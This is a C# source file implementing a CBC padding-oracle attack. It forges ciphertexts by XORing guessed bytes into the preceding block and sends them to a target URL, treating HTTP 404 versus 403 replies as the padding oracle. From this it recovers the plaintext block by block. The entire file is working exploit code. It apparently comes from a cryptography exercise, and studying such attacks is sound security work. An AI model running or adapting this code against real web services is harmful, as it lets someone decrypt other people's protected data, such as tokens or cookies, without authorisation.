using Cipher;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace PaddingAttack
{
	public class Suggestion {
		public Suggestion(byte code, byte position, int block) {
			this.Code = code;
			this.Position = position;
			this.Block = block;
		}

		public byte Code { get; private set; }
		public byte Position { get; private set; }
		public int Block { get; private set; }
	}

	public class PaddingArgs : EventArgs {
		public string DecodedString { get; set; }
	}

	public class PaddingAttack
	{
		WebClient _client = new WebClient();
		private string[] _cipherText = new string[4];
		private byte[] _result = new byte[16];
		private string _url;
		private string _message = String.Empty;
		public EventHandler FinishGuessHandler;

		private void OnFinishGuess() {
			if (FinishGuessHandler != null)
			{
				PaddingArgs result = new PaddingArgs();
				result.DecodedString = _message;
				FinishGuessHandler(null, result);
			}
		}

		public PaddingAttack(string ciphertext, string url) {
			var i = 0;
			while (i*32 < ciphertext.Length) {
				_cipherText[i] = ciphertext.Substring(i*32, 32);
				i += 1;
			}
			_url = url;
			_client.DownloadDataCompleted += new DownloadDataCompletedEventHandler(UpdateResult);
		}

		private void UpdateResult(object sender, DownloadDataCompletedEventArgs e)
		{
			if ((e.Error != null && e.Error is WebException) || e.Result != null) {
				var exception = e.Error as WebException;
				HttpWebResponse response = null;
				if (exception != null)
				{
					response = exception.Response as HttpWebResponse;
				}
				Suggestion nextSymbolGuess;
				var correctGuess = e.UserState as Suggestion;
				if ((e.Error == null && e.Result != null) || response.StatusCode == HttpStatusCode.NotFound)
				{
					// correct guess
					_result[15 - correctGuess.Position] = correctGuess.Code;

					// finish to decipher a block
					if (correctGuess.Position + 1 >= 16)
					{
						_message += CipherHelper.GetASCIIString(_result);
						OnFinishGuess();
						_result = new byte[16];
						nextSymbolGuess = new Suggestion(0, 0, correctGuess.Block + 1);
						if (nextSymbolGuess.Block >= 4)
						{
							// finish attack
							return;
						}
					}
					else
					{
						nextSymbolGuess = new Suggestion(0, (byte)(correctGuess.Position + 1), correctGuess.Block);
					}
				}
				else if (response.StatusCode == HttpStatusCode.Forbidden)
				{
					// incorrect guess
					if (correctGuess.Code == 255)
						throw new ArgumentException("All suggestions are incorrect");
					nextSymbolGuess = new Suggestion((byte)(correctGuess.Code + 1), correctGuess.Position, correctGuess.Block);
				}
				else
				{
					throw new ArgumentOutOfRangeException("Strange Response");
				}
				SendMessage(nextSymbolGuess);
			}
		}

		private byte[] GetGeussBytes(Suggestion guess) {
			var res = new byte[16];
			int index = 15;
			do
			{
				res[index--] = (byte)(guess.Position + 1);
			} while (15 <= guess.Position + index);
			res[15 - guess.Position] = CipherHelper.Xor(new byte[] {res[15 - guess.Position]},
				new byte[] {guess.Code})[0];
			index = 15;
			while(15 - index < guess.Position) {
				res[index] = CipherHelper.Xor(new byte[] { res[index] }, new byte[] { _result[index] })[0];
				index--;
			}
			return res;
		}

		private string GetGuessCipherText(Suggestion guess)
		{
			string result = String.Empty;
			var index = 0;
			do
			{
				result += _cipherText[index];
				index++;
			} while (index < guess.Block);
			var cipherBytes = CipherHelper.ConvertFromHexString(_cipherText[guess.Block]).ToArray<byte>();
			var guessBytes = GetGeussBytes(guess);
			var attackerBytes = CipherHelper.Xor(cipherBytes, guessBytes).ToArray<byte>();

			result += CipherHelper.GetHexValue(attackerBytes);
			result += _cipherText[guess.Block + 1];
			return result;
		}

		public void Start(){
			var firstGuess = new Suggestion(0, 0, 2);
			SendMessage(firstGuess);
		}

		private void SendMessage(Suggestion suggestion)
		{
			var guessUrl = _url + this.GetGuessCipherText(suggestion);
			_client.DownloadDataAsync(new Uri(guessUrl.ToLowerInvariant()), suggestion);
		}
	}
}
